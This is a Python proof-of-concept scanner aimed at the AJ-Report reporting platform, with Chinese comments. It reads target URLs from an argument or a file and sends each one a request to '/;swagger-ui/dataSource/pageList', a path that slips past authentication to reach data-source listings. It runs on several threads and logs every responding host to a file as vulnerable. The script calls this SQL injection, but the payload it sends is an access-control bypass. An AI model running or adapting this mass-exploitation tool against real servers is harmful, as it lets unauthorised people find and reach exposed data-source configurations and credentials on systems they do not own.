import requests
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

# 创建解析器
parser = argparse.ArgumentParser(description='Aj-Report Sql insertion test')
# 添加参数
parser.add_argument('-u', '--url', type=str, help='目标网址')
parser.add_argument('-f', '--file', type=str, help='网址文件')
parser.add_argument('-t', '--threads', type=int, default=5, help='线程数，默认为5')


def poc_attack(url):
    headers = {
        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
        "connection": "close",
        "accept-encoding": "gzip"
    }
    attack_url = url + "/;swagger-ui/dataSource/pageList?showMoreSearch=false&pageNumber=1&pageSize=10"
    try:
        response = requests.get(url=attack_url, headers=headers, timeout=10)
        if response.status_code == 200 and "操作成功" in response.text:
            print(attack_url + "存在aj-report sql注入漏洞")
            with open("vuln_urls.txt", "a") as file:
                file.write(attack_url + "\n")
        else:
            print(attack_url + "不存在aj-report sql注入漏洞")
    except requests.exceptions.Timeout:
        print(f"URL: {attack_url} 请求超时，跳过...")
    except requests.exceptions.RequestException as e:
        print(f"URL: {attack_url} 请求出错：", e)


if __name__ == "__main__":
    args = parser.parse_args()
    urls = []

    if args.url:
        urls.append(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls.extend(file.read().splitlines())

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_url = {executor.submit(poc_attack, url): url for url in urls}
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                future.result()
            except Exception as e:
                print(f"处理 {url} 时出错：", e)
